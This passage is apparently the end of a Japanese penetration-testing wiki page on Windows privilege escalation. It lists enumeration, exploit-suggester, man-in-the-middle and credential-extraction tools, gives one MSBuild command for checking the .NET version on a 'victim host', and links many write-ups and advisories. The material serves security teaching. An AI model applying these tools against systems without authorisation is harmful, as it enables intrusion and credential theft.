[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh は PowerShell ADIDNS/LLMNR/mDNS spoofer および man-in-the-middle tool です。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的な privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 既知の privesc vulnerabilities を検索（Watson のため **DEPRECATED**）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- local checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知の privesc vulnerabilities を検索（VisualStudio を使用して compile する必要があります）([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurations を探して host を enumeration します（privesc tool というより情報収集 tool です）（compile が必要）**(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多数の software から credentials を抽出します（github に precompiled exe があります）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp の C# への port**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfiguration を確認します（github に executable precompiled があります）。推奨されません。Win10 では正常に動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- possible misconfigurations を確認します（python からの exe）。推奨されません。Win10 では正常に動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この post に基づいて作成された tool（正常に動作させるために accesschk への access は必要ありませんが、使用できます）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** の output を読み取り、動作する exploits を推奨します（local python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** の output を読み取り、動作する exploits を推奨します（local python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

.NET の正しい version を使用して project を compile する必要があります（[こちらを参照](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。victim host にインストールされている .NET の version を確認するには、次のように実行します。
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 参考資料

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: SMTP経由のWord VBA macro phishing → hMailServer credential decryption → Veeam CVE-2023-27532によるSYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Kernel ShadowsにおけるCat & Mouse](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – SCADA Systemに存在するPrivileged File System Vulnerability](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlinkの使用方法](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. WindowsでSymbolic Linksを悪用する](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: WindowsにおけるDangerous Module Resolution](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: `node_modules` foldersからのloading](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Trail of Bits - C/C++ checklist challenges, solved](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [Pwn2Own with Microslop: Windows LPE向けにCLDFLTとDirectX Kernel Race Conditionsをchainする](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [One I/O Ring to Rule Them All: Windows 11におけるFull Read/Write Exploit Primitive](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)

{{#include ../../banners/hacktricks-training.md}}
